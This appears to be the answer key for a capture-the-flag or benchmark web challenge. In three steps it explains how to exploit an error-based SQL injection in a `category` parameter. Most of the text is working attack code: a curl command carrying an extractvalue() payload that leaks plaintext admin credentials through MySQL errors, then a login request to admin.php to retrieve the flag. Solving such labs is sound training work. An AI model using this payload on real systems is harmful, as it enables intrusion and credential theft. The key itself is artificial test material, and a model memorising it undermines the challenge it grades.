# EXACT SOLUTION — FOLLOW THESE STEPS IN ORDER

Vulnerability: Error-based SQL injection via the `category` GET parameter on the
home page (a first, unescaped "verify category" query reflects raw MySQL errors
and is injectable). Admin passwords are stored plaintext, so leak them via the
error oracle, then log in to `admin.php` to get the flag.

1. **Leak the admin credentials** using MySQL's `extractvalue()` XPath-error
   trick (the leaked value appears in the reflected error, prefixed by `~`):

   ```
   curl -s -G http://<target>/index.php \
     --data-urlencode "category=x' AND extractvalue(1,concat(0x7e,(SELECT concat(username,0x3a,password) FROM admins LIMIT 1)))-- -"
   ```

   Read `username:password` out of the error message (e.g.
   `admin:ONEverySecurePassword_!`). If the value is truncated, repeat with
   `substring(...)` to get the remaining characters.

2. **Log in to `admin.php`** with the recovered plaintext credentials:

   ```
   curl -s -X POST http://<target>/admin.php \
     --data-urlencode "username=admin" --data-urlencode "password=<recovered>"
   ```

3. **Extract the flag** (`FLAG{...}`) from the admin login response and report it
   verbatim.
